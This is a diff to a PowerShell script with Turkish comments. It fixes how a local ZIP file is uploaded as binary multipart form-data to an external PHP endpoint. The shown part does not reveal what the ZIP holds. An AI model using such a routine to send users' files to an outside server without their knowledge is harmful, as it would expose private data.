@@ -92,31 +92,49 @@ $url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si
 
 if (Test-Path $zipFilePath) {
     try {
-        # Multipart form-data oluşturma
-        $boundary = [System.Guid]::NewGuid().ToString()
+        # Multipart form-data boundary oluşturma
+        $boundary = [System.Guid]::NewGuid().ToString("N")
         $contentType = "multipart/form-data; boundary=$boundary"
 
-        # Dosya içeriğini oku
-        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
+        # Form data başlıkları
         $fileName = [System.IO.Path]::GetFileName($zipFilePath)
+        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`nContent-Type: application/zip`r`n`r`n"
+        $footer = "`r`n--$boundary--`r`n"
 
-        # Multipart form-data body oluşturma
-        $body = (
-            "--$boundary`r`n" +
-            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`n" +
-            "Content-Type: application/zip`r`n`r`n" +
-            [System.Text.Encoding]::Default.GetString($fileBytes) + "`r`n" +
-            "--$boundary--`r`n"
-        )
+        # Dosya içeriğini oku (binary olarak)
+        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
+
+        # Body oluşturma
+        $bodyStream = New-Object System.IO.MemoryStream
+        $writer = New-Object System.IO.StreamWriter $bodyStream
+        $writer.Write($header)
+        $writer.Flush()
+
+        # Binary dosyayı ekleme
+        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
+        $writer.Flush()
+
+        # Footer ekle
+        $writer.Write($footer)
+        $writer.Flush()
+
+        # Body'yi byte array olarak oku
+        $bodyStream.Position = 0
+        $bodyBytes = $bodyStream.ToArray()
 
         # POST isteğini gönder
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType $contentType -ErrorAction Stop
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType $contentType -ErrorAction Stop
 
         # Yanıtı göster
         Write-Output $response
+
+        # Temizlik
+        $writer.Dispose()
+        $bodyStream.Dispose()
     } catch {
         Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
     }
 } else {
     Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
 }
+
